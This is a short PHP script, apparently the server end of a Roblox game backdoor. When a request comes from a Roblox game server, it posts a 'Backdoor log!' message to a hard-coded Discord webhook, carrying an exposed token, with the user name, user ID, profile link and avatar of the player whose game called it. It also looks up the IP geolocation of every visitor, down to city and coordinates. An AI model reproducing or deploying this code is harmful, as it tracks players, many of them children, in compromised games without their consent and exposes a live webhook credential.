<?php
//Get the IP & Info
$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];

//Info
$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates

if ($_SERVER['HTTP_USER_AGENT'] == 'Roblox/WinInet') {
    $hookObject = json_encode([
        'embeds' => [[
            'title' => 'Backdoor log!',
            'description' => "\n**Browser:** $Browser incase webserver crack xd\n**User:** " . $_GET["user"] . " (**User ID:**   " . $_GET["userid"] . ")\n**Profile Link:** https://roblox.com/users/" . $_GET["userid"] . "/profile", 
            'color' => hexdec('ff0000'), "image" => ["url" => "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" . $_GET["user"] . 
            $dylanlol]]]],
    JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
    $curl = curl_init('https://discord.com/api/webhooks/948019153078472725/CyqMt67ubocy2O5eYJ5xUX7FEx3g-nlNEzrc30b3YXv-b6St9pUagPYB4SsdOC1H9SZN');
    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($curl, CURLOPT_POSTFIELDS, $hookObject);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($curl);
} else {
    echo("monke");
};
?>
